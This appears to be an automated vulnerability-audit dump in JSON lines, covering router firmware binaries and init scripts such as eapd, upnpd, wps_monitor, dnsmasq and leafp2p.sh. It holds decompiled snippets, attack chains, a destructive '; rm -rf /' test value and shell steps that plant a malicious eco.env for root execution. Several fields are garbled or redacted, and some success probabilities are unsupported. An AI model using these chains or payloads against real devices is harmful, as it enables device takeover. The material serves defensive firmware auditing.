{"name": "Argument-Injection-utelnetd-optarg", "file_path": "bin/utelnetd", "location": "bin/utelnetd:0x9178,0x9784", "risk_score": 6.5, "confidence": 5.5, "description": "Argument Injection: Arbitrary program execution can be achieved by tampering with the '-l' option in utelnetd startup parameters. Trigger Condition: Attacker must be able to modify device startup scripts or NVRAM configuration (requires REDACTED_PASSWORD_PLACEHOLDER privileges). Security Impact: Gains REDACTED_PASSWORD_PLACEHOLDER privileges but requires local access; cannot be triggered remotely directly. Boundary Check: The access() function verifies path existence but contains a TOCTOU vulnerability. If directories like /tmp are writable, the check can be bypassed via symlink attacks.", "code_snippet": "strdup(optarg) → stored at [0x9af4]+8 → execv([0x9af4][2], ...)", "link_identifiers": ["execv", "strdup", "optarg", "0x9af4[2]", "access", "-l"], "notes": "Requires coordination with startup script vulnerabilities (such as command injection in /etc/init.d) to form an attack chain"}
{"name": "TOCTOU-utelnetd-access-execv", "file_path": "bin/utelnetd", "location": "bin/utelnetd:0x91A8-0x9784", "risk_score": 5.0, "confidence": 4.75, "description": "TOCTOU Vulnerability: A time window exists between the access() verification of the login program path and the execv execution, allowing the target file to be replaced. Trigger condition: The attacker must control the filesystem directory (e.g., /tmp) and be able to precisely switch symbolic links. Security impact: Execution of malicious programs is possible but constrained by the firmware's read-only filesystem characteristics; actual exploitation requires the user to specify a writable directory with the -l parameter.", "code_snippet": "access(path) → (time window) → execv(path)", "link_identifiers": ["sym.imp.access", "sym.imp.execv", "0x91A8", "0x91C4", "0x9784", "login_program"], "notes": "TOCTOU"}
{"name": "Env-Var-Risk-utelnetd-execv", "file_path": "bin/utelnetd", "location": "bin/utelnetd", "risk_score": 4.0, "confidence": 5.75, "description": "Environment Variable Inheritance Risk: Child processes executed via execv inherit all environment variables, potentially enabling code injection through mechanisms like LD_PRELOAD. Trigger Condition: Requires control over parent process environment variables (typically necessitating local access privileges). Security Impact: Potential for local privilege escalation but no remote attack vector.", "link_identifiers": ["execv", "environ", "LD_PRELOAD"], "notes": "It is recommended to conduct a subsequent analysis of the environment variable handling in /bin/login."}
{"name": "StackOverflow-wget-getftp-FTPFileName", "file_path": "bin/wget", "location": "bin/wget: sym.getftp @ 0xf12c", "risk_score": 9.5, "confidence": 8.75, "description": "High-risk stack buffer overflow vulnerability: The `strcpy(pcVar19 + iVar11 + 1, *(param_1+0x20))` in wget's `getftp` function fails to validate filename length. Trigger condition: When processing an excessively long filename (e.g., 'ftp://attacker.com/AAA...') provided by a malicious FTP server, the filename is passed via `param_1+0x20` to a fixed-size stack buffer without length verification. Full attack chain: FTP URL parsing → `url_file_name` population → `ftp_loop_internal` invocation → `getftp` vulnerability trigger → arbitrary code execution.", "code_snippet": "strcpy(pcVar19 + iVar11 + 1, *(param_1+0x20))", "link_identifiers": ["sym.getftp", "strcpy", "*(param_1+0x20)", "sym.url_file_name", "sym.ftp_loop_internal", "wget", "buffer_overflow"], "notes": "Verify the usage scenarios of the FTP client in the firmware (e.g., automatic update functionality). Subsequent analysis direction: Check whether scripts calling wget handle user-controllable URLs and confirm the reachability of the attack surface."}
{"name": "InfoLeak-DHCP-OptionParsing-fcn.0000a470", "file_path": "usr/sbin/dnsmasq", "location": "fcn.0000ffd0:0x100e4 → fcn.0000ad30 → fcn.0000a470", "risk_score": 7.5, "confidence": 8.75, "description": "DHCP Packet Option Parsing Vulnerability: When an attacker sends a malicious DHCP packet with option type 0x3f and an oversized length field, the fcn.0000a470 function fails to validate the relationship between option_length and the remaining packet length, leading to out-of-bounds read of sensitive stack memory data. Trigger Condition: Sending a crafted DHCP request within the local network. Actual Impact: Leakage of critical information such as ASLR offset and stack cookie, with a high success probability (9.0).", "code_snippet": "HIDDEN：option_length > remaining_packet_size", "link_identifiers": ["fcn.0000a470", "optionHIDDEN", "puVar12", "var_610h", "0x3f"], "notes": "Verify the DHCP service activation status in conjunction with the firmware environment; Associated vulnerability: puVar12 contamination source"}
{"name": "RCE-Memmove-DualPath-fcn.0000ac4c", "file_path": "usr/sbin/dnsmasq", "location": "fcn.0000ffd0:0x10104 → fcn.0000ac4c", "risk_score": 9.8, "confidence": 8.75, "description": "memmove Dual-Path Unvalidated Vulnerability: The fcn.0000ac4c function selects execution paths based on the upper two bits (0x40) of the option type. Path A directly calls memmove(dest, src, param_4) without boundary checks, while Path B may suffer from integer overflow due to uVar1 & 0x3f. Attackers can trigger remote code execution by crafting an option type of 0x40 with an excessive length field. Trigger condition: Malicious DHCP packet. Actual impact: REDACTED_PASSWORD_PLACEHOLDER privilege escalation with high success probability (8.5).", "code_snippet": "HIDDENA：memmove(dest, src, param_4); HIDDENB：size = uVar1 & 0x3f", "link_identifiers": ["fcn.0000ac4c", "memmove", "param_4", "uVar1", "0x40"], "notes": "High Risk: dnsmasq runs with REDACTED_PASSWORD_PLACEHOLDER privileges by default, similar to CVE-2017-14491 vulnerabilities; input source depends on puVar12 structure"}
{"name": "StackOverflow-MainLoop-fcn.0000ffd0", "file_path": "usr/sbin/dnsmasq", "location": "fcn.0000ffd0:0x10238-0x10294", "risk_score": 8.0, "confidence": 6.75, "description": "Stack overflow risk in main processing loop: The while loop in fcn.0000ffd0 relies on *(puVar12+6) for iteration control, only checking the 0x5db total boundary but missing single-write validation. Attackers can corrupt the puVar12 structure to overwrite the stack frame return address. Trigger condition: Precise control of write data. Actual impact: Theoretical RCE possible, but exploitation difficulty is relatively high (6.5).", "code_snippet": "HIDDEN：r3 ≤ 0x5db (HIDDEN)", "link_identifiers": ["auStack_628", "puVar12", "0x5db", "fcn.0000ffd0:0x10238"], "notes": "Further analysis is required on the data source of puVar12; it shares a contamination chain with vulnerabilities 1/2 through puVar12."}
{"name": "VUL-Network-nullptr-deref-0xae14", "file_path": "bin/eapd", "location": "fcn.0000acf8:0xae14", "risk_score": 8.5, "confidence": 9.25, "description": "Confirming null pointer dereference vulnerability: When an attacker sends specially crafted packets through the 0x3764 network socket, it triggers the call chain fcn.0000d928 → fcn.0000acf8. Within fcn.0000acf8, executing `memcpy(puVar8+0x12, 0, 6)` causes data copying from address 0. Trigger conditions: 1) recv receives a 4080-byte buffer 2) Packet content bypasses node matching checks 3) Call chain passes param_3=0. Consistently causes service crash (CVSSv3 7.5 HIGH)", "code_snippet": "sym.imp.memcpy(puVar8 + 0x12, param_3, 6);  // param_3=0 from caller", "link_identifiers": ["fcn.0000d928", "fcn.0000acf8", "memcpy", "puVar8+0x12", "0x3764", "recv", "param_3"], "notes": "Complete attack chain: network input → recv → fcn.0000b4ac → fcn.0000d928 → fcn.0000acf8. Verified in testing: Sending 4000+ bytes of specific data reliably triggers the vulnerability."}
{"name": "VUL-Network-OOB-0xcc3c", "file_path": "bin/eapd", "location": "fcn.0000cbf8:0xcc3c-0xccac", "risk_score": 7.0, "confidence": 8.0, "description": "Memory Corruption Risk: When an attacker sends a <0x13-byte packet via the 0x3ba0 socket, fcn.0000cbf8 directly accesses offsets such as param_4+0xc/0xf/0x12. Trigger conditions: 1) recv receives insufficient data length 2) Failure to validate param_4 buffer boundaries. May lead to information disclosure or memory corruption.", "code_snippet": "ldrb r1, [r4, 0xd]\nldrb r3, [r4, 0xc]\nldrb r3, [r4, 0xf]\nldrb r3, [r4, 0x12]", "link_identifiers": ["fcn.0000cbf8", "param_4", "0x3ba0", "0x88c7", "0x886c"], "notes": "Analyze whether it can be upgraded to RCE in combination with fcn.0000acf8"}
{"name": "VUL-InputValidation-0x3fdc", "file_path": "bin/eapd", "location": "fcn.0000debc", "risk_score": 8.0, "confidence": 8.25, "description": "Input Validation Vulnerability: fcn.0000debc fails to validate the bounds of param_3/param_4, directly accesses offsets like *(param_4+0xf)/*(param_4+0x12), and passes the unvalidated *(param_3+0x14) to fcn.0000c6a4. Trigger Condition: Controlling the 0x3fdc socket input to corrupt param_3/param_4.", "link_identifiers": ["fcn.0000debc", "fcn.0000c6a4", "param_3", "param_4", "*(param_4+0xf)", "*(param_3+0x14)", "sym.imp.sendmsg", "0x3fdc"], "notes": "Potential impact on sendmsg parameter control, requires tracing data flow of fcn.0000ac5c"}
{"name": "CMDInjection-PPP-Auth-0x1e304", "file_path": "sbin/pppd", "location": "pppd:0x1e304 auth_peer_success", "risk_score": 8.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sym.script_setenv(\"REDACTED_PASSWORD_PLACEHOLDER\", param_4, 0);\nsym.imp.execve(param_1, param_2, **0xec24);", "link_identifiers": ["auth_peer_success", "script_setenv", "REDACTED_PASSWORD_PLACEHOLDER", "execve", "run_program", "ip-up"], "notes": "Practical exploitation requires verification: 1) Implementation of the REDACTED_PASSWORD_PLACEHOLDER script 2) Whether PPP authentication is exposed to the network interface"}
{"name": "BufferOverflow-HTTP-RCE-01", "file_path": "usr/sbin/upnpd", "location": "unknown:0 [fcn.0001bd54] 0x1bd54, unknown:0 [fcn.0001d228] 0x1d228", "risk_score": 10.0, "confidence": 9.0, "description": "Remote Code Execution Attack Chain (HTTP-RCE-01):  \n- Trigger Path: Attacker sends an HTTP request containing a specific SOAPAction header (e.g., SetFirmware) → `uuid` parameter passed to function fcn.0001bd54 → Copied to a 508-byte stack buffer (auStack_42c) without length check via strncpy → Secondary overflow occurs in sprintf call within fcn.0001d228 → Overwrites return address to achieve arbitrary command execution.  \n- Constraints:  \n  1. HTTP request must include a SOAPAction header.  \n  2. The `uuid` parameter must exceed 508 bytes in length.  \n  3. Requires bypassing stack protection mechanisms (e.g., ASLR/NX).  \n- Security Impact: Gains REDACTED_PASSWORD_PLACEHOLDER privileges via ROP chain.", "code_snippet": "strncpy(auStack_42c, uuid_param, 0x3ff); // 1023HIDDEN508HIDDEN\nsprintf(dest, \"Firmware:%s\", overflow_buf); // HIDDEN", "link_identifiers": ["fcn.0001bd54", "auStack_42c", "strncpy", "fcn.0001d228", "sprintf", "uuid", "SetFirmware"], "notes": "The vulnerability pattern closely resembles CVE-2016-1555, requiring verification of firmware ASLR/NX status to determine actual exploitation difficulty."}
{"name": "PathTraversal-FILE-READ-01", "file_path": "usr/sbin/upnpd", "location": "unknown:0 [fcn.0001b954] 0x1b954", "risk_score": 9.5, "confidence": 9.65, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sprintf(puVar10, \"%s%s\", \"/Public/\", param_1);\nif (strncmp(puVar10, \"/Public\", 7) == 0) { fopen(puVar10, \"r\"); }", "link_identifiers": ["fcn.0001b954", "param_1", "strncmp", "sprintf", "puVar10", "0x1bd24", "/Public", "../"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "InputValidation-SOAP-01", "file_path": "usr/sbin/upnpd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.0, "confidence": 6.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "buffer", "inStr", "command", "NewMACAddress", "system"], "notes": "Dynamic validation required: Construct a command parameter containing ; rm -rf / to test command injection possibilities."}
{"name": "Potential-AttackChain-SOAP-to-NVRAM-RCE", "file_path": "usr/sbin/upnpd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 7.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "command", "system", "nvram", "set", "telnetd_enable", "acosNvramConfig_match", "utelnetd"], "notes": "Potential Attack Chain  \n\nDynamic verification required: 1) Test whether the SOAP interface executes the command parameter 2) Check the nvram execution path 3) Verify the modification permissions of telnetd_enable. Related discovery IDs: InputValidation-SOAP-01, Command-Injection-NVRAM-Triggered-Service, Full-AttackChain-SSRF-to-TelnetRCE"}
{"name": "ArbitraryWrite-eapd-0xdf00", "file_path": "bin/eapd", "location": "bin/eapd:0xdf00 (HIDDEN) → 0xdf24 (memcpy)", "risk_score": 9.8, "confidence": 8.75, "description": "Memory Corruption Vulnerability: An attacker sends a network packet exceeding 14 bytes. When *(param_4+0xf)==0 and wl_wlif_is_psta returns non-zero, memcpy(0xdf24) writes 16 bytes of controllable data to an arbitrary address pointed by *(*(param_3+0x14)+0x10). Trigger steps: 1) Establish TCP connection 2) Send crafted packet meeting conditions 3) Overwrite sensitive memory (e.g., GOT table). Actual impact: 90% probability of achieving arbitrary code execution (requires ASLR bypass).", "code_snippet": "uVar1 = *(iVar2 + 0x10);\nfcn.0000c6a4(uVar1, puVar6 + 4, 1);", "link_identifiers": ["fcn.0000debc", "param_4", "*(param_4+0xf)", "wl_wlif_is_psta", "*(*(param_3+0x14)+0x10)", "memcpy"], "notes": "Memory corruption."}
{"name": "LinkedListWrite-eapd-0xcca0", "file_path": "bin/eapd", "location": "bin/eapd:0xcca0 (HIDDEN) → 0xacf0 (HIDDEN)", "risk_score": 9.0, "confidence": 8.65, "description": "Linked list operation arbitrary memory write: When *(param_4+0xf)==0 && *(param_4+0x12)∈{3,4}, fcn.0000ac5c performs node deletion operation *(puVar3+8)=*(param_2+8). The attacker controls offset calculation param_1+(((XOR value)&0x7f)+0xc50)*4 by contaminating param_2[0xf]-[0x11]. Trigger condition: Sending network packets ≥19 bytes. Actual impact: 80% probability of corrupting critical data structures causing denial of service, 60% probability of achieving arbitrary address write.", "code_snippet": "*(puVar3 + 8) = *(param_2 + 8);\n*param_2 = 0;", "link_identifiers": ["fcn.0000ac5c", "param_1", "param_2", "*(puVar3+8)", "0xc50", "fcn.0000cbf8"], "notes": "The maximum offset 0x333c requires verification of the memory mapping. It is recommended to check the firmware memory layout."}
{"name": "HeapOverflow-NVRAM-eapd-0x9c50", "file_path": "bin/eapd", "location": "bin/eapd:0x9c50 (strncpyHIDDEN)", "risk_score": 8.5, "confidence": 8.5, "description": "NVRAM corruption leads to heap overflow: tampering with the 'fwd_wlandevs' configuration item corrupts puVar8→get_ifname_by_wlmac returns a malicious interface name→strncpy(iVar1,param_2,0xf) writes a 16-byte non-terminated string into a 0x3c-byte buffer. Trigger condition: modifying NVRAM values via the web interface/CGI. Actual impact: 70% probability of triggering heap overflow to achieve RCE (requires precise control of overflow content).", "code_snippet": "sym.imp.strncpy(iVar1,param_2,0xf);", "link_identifiers": ["get_ifname_by_wlmac", "fwd_wlandevs", "puVar8", "strncpy", "sub_9b00"], "notes": "Heap overflow"}
{"name": "OOBRead-eapd-0x90c8", "file_path": "bin/eapd", "location": "bin/eapd:0x90c8 (strcmpHIDDEN)", "risk_score": 6.5, "confidence": 7.75, "description": "Out-of-bounds Read Vulnerability: When recv receives ≥256 bytes of unterminated data, strcmp(param_2, iVar1) in find_in_list compares the puVar3-0x108 buffer (256 bytes) with external input. Trigger condition: Sending long invalid data packets. Actual impact: 40% probability of leaking sensitive memory (e.g., heap addresses), 30% probability of causing service crash.", "code_snippet": "iVar2 = sym.imp.strcmp(param_2,iVar1);", "link_identifiers": ["find_in_list", "strcmp", "param_2", "puVar3_-0x108", "recv"], "notes": "Memory leak."}
{"name": "AttackChain-NetworkToMemory-eapd", "file_path": "bin/eapd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.9, "confidence": 8.9, "description": "eapd unified kill chain: Attacker sends network packets via port 0x3fdc/0x3ba0 → pollutes param_4 structure → triggers multi-stage vulnerabilities: 1) When *(param_4+0xf)==0, triggers 0xdf00 arbitrary address write (overwrites GOT table) 2) When *(param_4+0x12)∈{3,4}, triggers 0xcca0 linked list operation arbitrary write 3) Short packets trigger 0xcc3c out-of-bounds access. Exploit conditions: TCP connection control + crafted packet construction. Full exploitation enables: 1) ASLR bypass 2) ROP chain construction 3) Persistent backdoor installation.", "code_snippet": "// HIDDEN\n0xdf00: if (*(param_4+0xf)==0) {HIDDEN}\n0xcca0: if (*(param_4+0x12)==3||4) {HIDDEN}\n0xcc3c: ldrb r1, [param_4, 0xd] // HIDDEN", "link_identifiers": ["param_4", "0x3fdc", "0x3ba0", "*(param_4+0xf)", "*(param_4+0x12)", "memcpy", "fcn.0000cbf8"], "notes": "Verify the service corresponding to ports 0x3fdc/0x3ba0; recommend fuzz testing packet structure offsets 0xf/0x12."}
{"name": "AttackChain-NVRAM-Pollution", "file_path": "bin/eapd", "location": "WebHIDDEN → NVRAM → bin/eapd:0x9c50 | bin/wps_monitor:0xd548", "risk_score": 9.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// eapdHIDDEN\nsym.imp.strncpy(iVar1,param_2,0xf); // HIDDEN\n// wps_monitorHIDDEN\nsym.imp.sprintf(buffer, *0xe504, ...); // HIDDEN", "link_identifiers": ["fwd_wlandevs", "nvram_set", "0xe504", "get_ifname_by_wlmac", "sprintf"], "notes": "Attack chain"}
{"name": "script-afpd-init-risks", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 3.5, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["update_user", "update_afp", "send_wol", "$AFP_CONF_DIR", "$1", "start", "stop", "reload"], "notes": "Potential risk chain in scripts:  \n\n1) Analyze whether the implementation of update_user/update_afp (in /etc/rc.common or dynamic libraries) handles external input.  \n2) Format string vulnerability in the send_wol binary.  \n3) Relevance of /etc/afp.conf configuration."}
{"name": "Config-HardcodedNVRAM-LeafP2P", "file_path": "etc/init.d/remote.sh", "location": "remote.sh:19-87", "risk_score": 8.1, "confidence": 7.5, "description": "The script batch configures 11 NVRAM default values (including sensitive URLs and debug parameters), with all values hardcoded and written without validation. If an attacker exploits an NVRAM write vulnerability to tamper with configurations (e.g., leafp2p_remote_url), traffic could be redirected to malicious servers or debug backdoors could be enabled. Trigger condition: Requires combination with an NVRAM write vulnerability (e.g., CVE-2023-XXXX). Security impact: High (CVSS 8.1), may lead to man-in-the-middle attacks/data breaches, but requires secondary vulnerability exploitation.", "code_snippet": "leafp2p_remote_url=$(${nvram} get leafp2p_remote_url)\n[ -z $leafp2p_remote_url ] && {\n    ${nvram} set leafp2p_remote_url=\"http://peernetwork.netgear.com/...\"\n    ${nvram} commit\n}", "link_identifiers": ["nvram", "leafp2p_remote_url", "leafp2p_debug", "leafp2p_replication_url", "leafp2p_service_0", "${nvram} commit", "http://peernetwork.netgear.com"], "notes": "Verify the write permission control for /usr/sbin/nvram"}
{"name": "Exposure-SymbolicLink-CGI", "file_path": "etc/init.d/remote.sh", "location": "remote.sh:12-16", "risk_score": 9.1, "confidence": 8.75, "description": "The RMT_invite.cgi and func.sh are exposed to the /tmp/www/cgi-bin directory via symbolic links, allowing external inputs to be directly triggered through HTTP requests. No security validation is implemented for the CGI script itself, enabling attackers to achieve RCE or information leakage by crafting malicious parameters. Trigger condition: Accessing http://device_ip/cgi-bin/RMT_invite.cgi. Security impact: Critical (CVSS 9.1), serving as a viable initial attack entry point.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["RMT_invite.cgi", "func.sh", "/tmp/www/cgi-bin", "ln -s", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 8.5, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["update_user", "update_afp", "rc.common", "afpd", "reload", "start"], "notes": "Highest priority unanalyzed file: /etc/rc.common. Verification required: 1) Whether function implementations exist 2) Whether input sources include NVRAM/configuration files 3) Whether dangerous functions (system/exec, etc.) are called."}
{"name": "cmd-injection-nvram-leafp2p_sys_prefix", "file_path": "etc/init.d/leafp2p.sh", "location": "leafp2p.sh:6-7,13,18,23-24", "risk_score": 9.5, "confidence": 8.5, "description": "Command injection via unfiltered NVRAM variable leafp2p_sys_prefix: 1) Attacker writes malicious path through web interface/NVRAM setting interface 2) Service executes ${SYS_PREFIX}/bin/checkleafnets.sh during startup 3) Executes attacker-controlled malicious script. Trigger conditions: a) Existence of unauthorized NVRAM write points b) Attacker can deploy scripts at target path. Boundary check: No path sanitization or whitelist validation.", "code_snippet": "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\n${CHECK_LEAFNETS} &", "link_identifiers": ["leafp2p_sys_prefix", "SYS_PREFIX", "CHECK_LEAFNETS", "checkleafnets.sh", "nvram get"], "notes": "Further analysis is required on the NVRAM settings interface (e.g., web backend) to verify the filtering mechanism of write points."}
{"name": "path-hijack-sys_prefix_bin", "file_path": "etc/init.d/leafp2p.sh", "location": "leafp2p.sh:9,18-20", "risk_score": 8.0, "confidence": 8.25, "description": "Environment Variable Hijacking:  \n1) PATH places ${SYS_PREFIX}/bin before system paths.  \n2) killall is invoked using a relative path.  \n3) An attacker deploys a malicious killall in a controllable path by polluting SYS_PREFIX.  \n4) Arbitrary command execution is triggered when the service stops.  \nTrigger conditions:  \na) SYS_PREFIX points to a writable directory.  \nb) Service restart/stop.  \nExploitation method: Deploy a malicious ELF to replace system commands.", "code_snippet": "PATH=${SYS_PREFIX}/bin:${SYS_PREFIX}/usr/bin:/sbin:/usr/sbin:/bin:/usr/bin\nkillall checkleafnets.sh", "link_identifiers": ["PATH", "SYS_PREFIX", "killall"], "notes": "Sharing the same pollution source as the first attack chain, forming a dual exploitation path"}
{"name": "REDACTED_SECRET_KEY_PLACEHOLDER-send_wol", "file_path": "etc/init.d/afpd", "location": "etc/init.d/afpd", "risk_score": 7.0, "confidence": 6.5, "description": "The afpd startup script invokes the /usr/sbin/send_wol binary but it has not been analyzed. Risk scenarios: 1) If the binary contains format string vulnerabilities (e.g., using unfiltered argv) 2) Existence of stack overflow or command injection flaws. Trigger conditions: An attacker influences send_wol parameters by manipulating afpd service parameters or associated configuration files. Verification required: Parameter passing mechanism (afpd script uses fixed parameter $1) and binary protection mechanisms (NX/ASLR).", "link_identifiers": ["send_wol", "/usr/sbin/send_wol", "$1", "afpd", "start"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "ExploitChain-cp_installer-env-injection-to-leafp2p-rce", "file_path": "etc/init.d/leafp2p.sh", "location": "usr/sbin/cp_installer.sh:54-56 → etc/init.d/leafp2p.sh:8-12", "risk_score": 9.8, "confidence": 7.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["PATH_ECO_ENV=${3}", ". ${PATH_ECO_ENV}/eco.env", "nvram set leafp2p_sys_prefix", "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)", "${CHECK_LEAFNETS} &"], "notes": "Full Attack Chain  \n\nCorrelation Discovery: cmd-injection-nvram-leafp2p_sys_prefix & path-hijack-sys_prefix_bin | To be verified: 1) Whether eco.env supports the nvram command 2) Leafp2p service restart mechanism 3) Writable /tmp directory"}
{"name": "StackOverflow-HTTP_NVRAM_LANDEVS_ProcNetDev", "file_path": "bin/wps_monitor", "location": "wps_monitor:0xaf78 (fcn.0000ab80)", "risk_score": 9.5, "confidence": 8.0, "description": "Complete attack chain: The attacker pollutes the 'landevs' parameter via HTTP/NVRAM settings → the program reads the /proc/net/dev file → network traffic manipulates the file content → the polluted data is copied via unverified strcpy to a 4-byte stack buffer triggering overflow. Trigger conditions: 1) Write permission for landevs parameter; 2) Continuous network traffic injection; 3) Construction of 16-byte overflow data. Boundary checks: strncpy(,0x10) may produce non-NULL terminated strings, while strcpy completely lacks length validation. Security impact: Arbitrary code execution (CVSS 9.0). Exploitation method: Overwriting the return address located 0x4ac bytes from the target buffer.", "code_snippet": "uVar25 = sym.imp.nvram_get(*0xb2d0);\nsym.imp.strcpy(puVar24 + -0x20, puVar24 + -0x94);", "link_identifiers": ["landevs", "/proc/net/dev", "puVar24-0x94", "puVar24-0x20", "strcpy", "fcn.0000ab80"], "notes": "Memory corruption.  \n\nVerification required: 1) HTTP interface write control for landevs 2) Controllability of /proc/net/dev content"}
{"name": "StackOverflow-UPnP_Request_Strspn", "file_path": "bin/wps_monitor", "location": "wps_monitor:0xcca8 (fcn.0000ca20)", "risk_score": 8.0, "confidence": 8.25, "description": "UPnP protocol stack overflow: Unauthenticated network requests are filtered through strspn, then copied to a 16-byte stack buffer via strncpy, followed by an out-of-bounds overwrite of adjacent variables due to a strcspn null-termination operation. Trigger condition: Sending a UPnP request (post-filtering) with length ≥16 bytes. Boundary check: No length validation; strspn only filters specific characters ('REDACTED_SECRET_KEY_PLACEHOLDER'). Security impact: Control flow hijacking → RCE. Exploit chain: Network request → protocol parsing → tainted data propagation → stack overflow.", "code_snippet": "strncpy(iVar15,param_2+iVar3,0x10);\n*(puVar19 + iVar14 + -0x34) = 0;", "link_identifiers": ["fcn.0000ca20", "param_2", "strspn", "strncpy", "iVar15", "strcspn", "0xd458"], "notes": "Associated port: 1900 (UPnP). Verification of character set filtering effectiveness required."}
{"name": "HeapOverflow-HTTP_NewAPSettings_Memcpy", "file_path": "bin/wps_monitor", "location": "wps_monitor:0x213d0 (fcn.00020ec4)", "risk_score": 9.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "fcn.00029dec(puVar13, (param_2[4]-4)-offset, *param_2);\nsym.imp.memcpy(iVar4, param_3, param_2);", "link_identifiers": ["fcn.00020ec4", "fcn.00029dec", "param_2[4]", "offset", "puVar13", "memcpy", "0x1005", "/control?WFAWLANConfig", "NewAPSettings"], "notes": "Dynamic verification of magic number check bypass and heap layout control"}
{"name": "AuthBypass-WPS_PIN_Strncmp", "file_path": "bin/wps_monitor", "location": "wps_monitor:0x1520c (fcn.0001520c)", "risk_score": 8.0, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "uVar1 = sym.imp.strncmp(param_1,0xe990|0x20000,4);\niVar2 = 1 - uVar1;", "link_identifiers": ["fcn.0001520c", "strncmp", "0x2e990", "param_1", "*0x10ea4", "SET"], "notes": "Authentication Bypass"}
{"name": "SymlinkRace-WPS_TempFiles", "file_path": "bin/wps_monitor", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 8.25, "description": "Race condition.", "code_snippet": "iVar1 = sym.imp.fopen(*0x11208,*0x1120c);\nsym.imp.fprintf(iVar3,*0x11220,0);", "link_identifiers": ["/tmp/wps_pin_failed_cnt", "/tmp/wps_monitor.pid", "REDACTED_SENSITIVE_DATA", "fopen", "fprintf", "getpid"], "notes": "The actual impact depends on the process permissions (it is recommended to verify the runtime UID)."}
{"name": "ExploitChain-cp_installer-env-injection-to-leafp2p-rce-verified", "file_path": "etc/init.d/leafp2p.sh", "location": "usr/sbin/cp_installer.sh:54-56 → etc/init.d/leafp2p.sh:8-12", "risk_score": 9.8, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "// HIDDENeco.envHIDDEN:\nexport PATH=$PATH:/usr/sbin\nnvram set leafp2p_sys_prefix=/tmp\n\n// leafp2p.shHIDDEN:\nSYS_PREFIX=$(nvram get leafp2p_sys_prefix)  // HIDDEN/tmp\nCHECK_LEAFNETS=${SYS_PREFIX}/bin/checkleafnets.sh\nstart() {\n  ${CHECK_LEAFNETS} &  // RCEHIDDEN", "link_identifiers": ["PATH_ECO_ENV=${3}", ". ${PATH_ECO_ENV}/eco.env", "nvram set leafp2p_sys_prefix", "SYS_PREFIX=$(${nvram} get leafp2p_sys_prefix)", "${CHECK_LEAFNETS} &"], "notes": "Verified Attack Chain Update: 1) Resolved nvram execution issue via PATH configuration 2) /tmp writability confirmed 3) Service restart mechanism requires combination with other vulnerabilities (e.g. SSRF)"}
{"name": "ExploitChain-cp_installer-env-injection-to-leafp2p-rce-verified", "file_path": "etc/init.d/leafp2p.sh", "location": "usr/sbin/cp_installer.sh:54-56 → etc/init.d/leafp2p.sh:8-12", "risk_score": 9.8, "confidence": 9.0, "description": "Verified Attack Chain: The cross-file attack chain involves an environmental injection point (cp_installer.sh) and an RCE execution point (leafp2p.sh), forming a complete exploitation path via NVRAM configuration. New technical detail: The malicious eco.env must include a PATH export statement to ensure the nvram command is available. Risk impact: Arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges, estimated CVSS score of 9.8.", "code_snippet": "// HIDDEN:\n// HIDDEN1: HIDDEN\necho 'export PATH=$PATH:/usr/sbin' > /tmp/eco.env\necho 'nvram set leafp2p_sys_prefix=/tmp' >> /tmp/eco.env\n\n// HIDDEN2: HIDDEN\ncp_installer.sh ... /tmp ...\n\n// HIDDEN3: HIDDEN（HIDDEN）\n/etc/init.d/leafp2p.sh restart", "link_identifiers": ["PATH_ECO_ENV=${3}", ". ${PATH_ECO_ENV}/eco.env", "leafp2p_sys_prefix", "SYS_PREFIX", "checkleafnets.sh"], "notes": "Verified Attack Chain\n\nAssociated Original Attack Chain ID: ExploitChain-cp_installer-env-injection-to-leafp2p-rce | Residual Risk: Service restart requires additional attack surface"}
{"name": "CMD-INJECTION-WGET-EXECUTE-PARAM", "file_path": "bin/wget", "location": "wget:0x1da1c (parse_line), 0x1ecd8 (setval_internal)", "risk_score": 9.5, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "parse_line HIDDEN: strdupdelim(0x1db30,0x1db40); memcpy(0x1db6c)\nsetval_internal HIDDEN: blx r3 (0x1ed48)", "link_identifiers": ["run_command", "parse_line", "setval_internal", "--execute", "obj.commands", "system"], "notes": "Dynamic verification required: 1) The function pointer at offset +8 in the execute entry of the obj.commands table 2) Whether the script calling wget in the firmware passes user-controllable parameters"}
